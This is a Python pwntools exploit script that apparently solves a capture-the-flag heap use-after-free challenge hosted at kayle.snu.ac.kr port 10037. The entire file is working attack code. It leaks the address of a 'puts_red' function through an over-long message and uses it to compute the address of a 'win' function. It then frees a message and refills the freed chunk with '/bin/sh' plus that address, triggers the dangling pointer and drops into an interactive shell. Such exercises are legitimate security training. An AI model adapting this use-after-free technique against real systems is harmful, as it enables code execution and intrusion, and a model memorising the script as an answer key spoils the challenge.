#!/usr/bin/env python3
from pwn import *

port = 10037
rem = remote("kayle.snu.ac.kr", port)
elf = ELF("./Heap Use-After-Free/problem/chall", checksec=False)

def create_message(index, msg):
    rem.sendlineafter(b'Your choice: ', b'1')
    rem.sendlineafter(b'Select message index (0 ~ 9): ', str(index).encode())
    rem.sendlineafter(b'Input message: ', msg)

def delete_message(index):
    rem.sendlineafter(b'Your choice: ', b'2')
    rem.sendlineafter(b'Select message index (0 ~ 9): ', str(index).encode())

def show_message(index):
    rem.sendlineafter(b'Your choice: ', b'3')
    rem.sendlineafter(b'Select message index (0 ~ 9): ', str(index).encode())

def create_feedback(length, feedback):
    rem.sendlineafter(b'Your choice: ', b'4')
    rem.sendlineafter(b'How long is your feedback: ', str(length).encode())
    rem.sendafter(b'Give me your feedback: ', feedback), sleep(0.1)

def show_feedback():
    rem.sendlineafter(b'Your choice: ', b'5')

def update_feedback(feedback):
    rem.sendlineafter(b'Your choice: ', b'6')
    rem.sendlineafter(b'Give me your new feedback: ', feedback)

win_offset = elf.symbols['win']
putsRed_offset = elf.symbols['puts_red']

payload = b"A" * 0x28
create_message(1, payload)
show_message(1)
rem.recvuntil(payload)
putsRed_addr = u64(rem.recvn(6) + b'\x00' * 2)
win_addr = putsRed_addr - putsRed_offset + win_offset

create_message(0, payload)
delete_message(0)

payload = b"/bin/sh"
payload += b"\x00" * (0x28 - len(payload))
payload += p64(win_addr)
create_feedback(0x30, payload)

show_message(0)

rem.interactive()
